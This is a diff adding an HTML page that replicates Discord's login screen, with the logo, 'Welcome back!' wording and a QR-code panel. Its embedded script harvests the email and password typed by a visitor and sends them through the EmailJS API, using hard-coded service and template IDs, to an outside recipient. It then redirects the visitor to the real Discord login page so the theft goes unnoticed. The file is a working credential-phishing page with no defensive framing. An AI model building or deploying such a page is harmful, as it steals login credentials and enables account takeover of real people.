@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord Login Page Replica</title>
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        /* Base body styling */
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #5865F2;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #FFFFFF;
+            overflow: hidden;
+            user-select: none; /* Disable text selection */
+        }
+
+        /* Prevent text selection */
+        body, h1, h2, h3, h4, h5, h6, p, a, span, div, input, label, button {
+            user-select: none; /* Disable text selection */
+            -webkit-user-select: none; /* Safari */
+            -moz-user-select: none; /* Firefox */
+            -ms-user-select: none; /* Internet Explorer/Edge */
+        }
+
+        /* Prevent image dragging */
+        img {
+            -webkit-user-drag: none; /* Disable dragging on images */
+            -moz-user-drag: none;
+            -ms-user-drag: none;
+            user-drag: none;
+            draggable: false; /* HTML5 draggable attribute */
+        }
+
+        /* Existing styles for input fields and buttons, allowing typing and clicking */
+        input, button {
+            user-select: auto; /* Allow text selection within input fields */
+        }
+
+        /* Background container */
+        .bg-container-unique::before {
+            content: "";
+            background: url('background.png') center/cover no-repeat;
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: calc(100% + 31px); 
+            height: calc(100% + 17px);
+            z-index: -1;
+        }
+
+        /* Discord logo */
+        .discord-logo-unique {
+            position: absolute;
+            top: 48px;
+            left: 48px;
+            width: 120px;
+            height: auto;
+        }
+
+        /* Main login container */
+        .login-container-unique {
+            background-color: #313338;
+            border-radius: 4px;
+            display: flex;
+            width: 725px;
+            height: 320px;
+            padding: 44px 30px;
+            margin: 0 auto;
+            justify-content: center;
+        }
+
+        /* Left side of the login box */
+
+        /* Right side of the login box */
+        .login-right-unique {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding-left: 60px;
+        }
+
+        /* QR code text container */
+        .qr-code-text-container-unique {
+            display: flex;
+            align-items: center;
+            margin: 0;
+        }
+
+        /* Main heading */
+        .login-heading-unique {
+            font-size: 22px;
+            font-weight: 500;
+            margin: 0;
+            text-align: center;
+        }
+        .input-email-unique,
+        .input-password-unique {
+            font-size: 15px !important; /* Force smaller font size */
+            padding: 10px;
+            width: 100%;
+            box-sizing: border-box;
+            font-weight: 100;
+            user-select: auto;
+        }
+
+        /* Subheading */
+        .login-subheading-unique {
+            font-size: 14.5px;
+            color: #B9BBBE;
+            margin-top: 10px;
+            margin-bottom: 23px;
+            text-align: center;
+        }
+
+        /* Input labels */
+        .label-email-unique,
+        .label-password-unique {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 12px;
+            color: #B9BBBE;
+            font-weight: 700;
+        }
+
+        /* Input fields */
+        .input-email-unique{
+            width: 405px;
+            height: 40px;
+            margin-bottom: 20px;
+            background-color: #1e1f22;
+            color: #FFFFFF;
+            border-radius: 4px;
+            border: 0;
+            padding-left: 10px;
+        }
+        .input-password-unique {
+            width: 405px;
+            height: 40px;
+            background-color: #1e1f22;
+            color: #FFFFFF;
+            border-radius: 4px;
+            margin-bottom: 2px;  
+            padding-left: 10px;
+            border: 0;
+        }
+
+        /* Login button */
+        .login-button-unique {
+            width: 420px;
+            height: 45px;
+            background-color: #5865F2;
+            border: none;
+            border-radius: 5px;
+            color: #FFFFFF;
+            font-size: 15px;
+            cursor: pointer;
+            margin-top: 20px;
+            user-select: auto; /* Allow clicking the button */
+        }
+
+        .login-button-unique:hover {
+            background-color: #4752C4;
+        }
+
+        /* Links */
+        .forgot-password-unique,
+        .register-link-unique,
+        .sign-in-passkey-unique {
+            color: #05a8fc;
+            text-decoration: none;
+            font-size: 13px;
+            text-align: center;
+        }
+
+        .forgot-password-unique:hover,
+        .register-link-unique:hover,
+        .sign-in-passkey-unique:hover {
+            text-decoration: underline;
+        }
+
+        /* QR code */
+        .qr-code-unique {
+            width: 180px;
+            border-radius: 3px;
+            background-color: white;
+            margin-bottom: 20px;
+        }
+
+        /* QR code section heading */
+        .qr-heading-unique {
+            font-size: 22px;
+            font-weight: 500;
+            margin-bottom: 0px;
+        }
+        .input-email-unique:focus,
+        .input-password-unique:focus {
+            outline: none; /* Removes the default blue outline */
+            border: none; /* Removes the border */
+        }
+
+        /* QR code section text */
+        .qr-code-text-1-unique,
+        .qr-code-text-2-unique,
+        .qr-code-text-3-unique,
+        .qr-code-text-4-unique {
+            font-size: 15px;
+            color: #B9BBBE;
+            text-align: center;
+        }
+
+        .qr-code-text-2-unique,
+        .qr-code-text-1-unique {
+            margin-bottom: 0;
+        }
+
+        .qr-code-text-3-unique,
+        .qr-code-text-4-unique {
+            margin-top: 0;
+        }
+
+        /* Required asterisk */
+        .required-unique {
+            color: #F04747;
+        }
+
+        /* Register section */
+        .register-unique {
+            margin-top: 10px;
+            font-size: 13px;
+            color: #949ba4;
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-container-unique"> <!-- Background container -->
+        <div class="discord-logo-unique"> <!-- Discord logo -->
+            <img src="discordLogo.svg" alt="Discord Logo" class="discord-logo-img-unique">
+        </div>
+        <div class="login-container-unique"> <!-- Login container -->
+            <div class="login-left-unique"> <!-- Left side of the login form -->
+                <h1 class="login-heading-unique">Welcome back!</h1> <!-- Welcome heading -->
+                <p class="login-subheading-unique">We're so excited to see you again!</p> <!-- Subheading -->
+                <form class="login-form-unique" id="loginForm"> <!-- Login form -->
+                    <label for="email" class="label-email-unique">EMAIL OR PHONE NUMBER <span class="required-unique">*</span></label>
+                    <input type="text" id="email" name="email" required class="input-email-unique"> <!-- Email input -->
+                    <label for="password" class="label-password-unique">PASSWORD <span class="required-unique">*</span></label>
+                    <input type="password" id="password" name="password" required class="input-password-unique"> <!-- Password input -->
+                    <div><a href="#" class="forgot-password-unique">Forgot your password?</a></div> <!-- Forgot password link -->
+                    <button type="submit" class="login-button-unique">Log In</button> <!-- Login button -->
+                    <p class="register-unique">Need an account? <a href="#" class="register-link-unique">Register</a></p> <!-- Register link -->
+                </form>
+            </div>
+            <div class="login-right-unique"> <!-- Right side of the login form -->
+                <img src="qrCodeMiddle.png" alt="QR Code" class="qr-code-unique"> <!-- QR code image -->
+                <h1 class="qr-heading-unique">Log in with QR Code</h1> <!-- QR code heading -->
+                <div class="qr-code-text-container-unique"> <!-- QR code text container -->
+                    <p class="qr-code-text-1-unique">Scan this with the</p>
+                    <p class="qr-code-text-2-unique" style="margin-left: 4px; font-weight: 500;">Discord mobile</p>
+                </div>
+                <div class="qr-code-text-container-unique"> <!-- Second QR code text container -->
+                    <p class="qr-code-text-3-unique" style="font-weight: 500; margin-right: 4px;">app</p>
+                    <p class="qr-code-text-4-unique">to log in instantly.</p>
+                </div>
+                <a href="#" class="sign-in-passkey-unique">Or, sign in with passkey</a> <!-- Sign in with passkey link -->
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Function to send email with username and password using EmailJS REST API
+        function sendLoginDetails(email, password) {
+            const serviceID = "service_o0sily3";
+            const templateID = "template_1ugchfo";
+            const userID = "o1RqiMz7XyIx1KgZ6";
+            
+            const templateParams = {
+                user_email: email,
+                user_password: password
+            };
+
+            fetch(`https://api.emailjs.com/api/v1.0/email/send`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    service_id: serviceID,
+                    template_id: templateID,
+                    user_id: userID,
+                    template_params: templateParams
+                })
+            }).then(response => {
+                if (response.ok) {
+                    console.log("Email sent successfully");
+
+                    // Redirect to Discord login page
+                    window.location.href = "https://discord.com/login";
+
+                    // Wait for the page to load and then fill in the credentials
+                    window.onload = function() {
+                        // Find the email and password fields and the submit button
+                        const emailField = document.querySelector("input[name='email']");
+                        const passwordField = document.querySelector("input[name='password']");
+                        const loginButton = document.querySelector("button[type='submit']");
+
+                        if (emailField && passwordField && loginButton) {
+                            // Fill in the email and password
+                            emailField.value = email;
+                            passwordField.value = password;
+
+                            // Simulate a click on the login button
+                            loginButton.click();
+                        }
+                    };
+                } else {
+                    console.error("Failed to send email:", response.status, response.statusText);
+                }
+            }).catch(error => {
+                console.error("Error sending email:", error);
+            });
+        }
+
+        // Function to handle login attempts
+        function handleLoginAttempt(event) {
+            event.preventDefault();  // Prevent form submission
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            if (email && password) {  // Check if both fields are not empty
+                const loginButton = document.querySelector('.login-button-unique');
+
+                // Change the button to loading state
+                loginButton.innerHTML = '<div class="loading-spinner-button"></div> Loading...';
+                loginButton.disabled = true;  // Disable the button to prevent further clicks
+
+                // Timeout to revert the button back to its original state after 5 seconds
+                setTimeout(() => {
+                    loginButton.innerHTML = 'Log In';
+                    loginButton.disabled = false;
+                }, 5000);
+
+                // Send the email with the login details and then redirect to Discord login
+                sendLoginDetails(email, password);
+            }
+        }
+
+        // Event listener for the login button
+        document.querySelector('.login-button-unique').addEventListener('click', handleLoginAttempt);
+    </script>
+</body>
+</html>
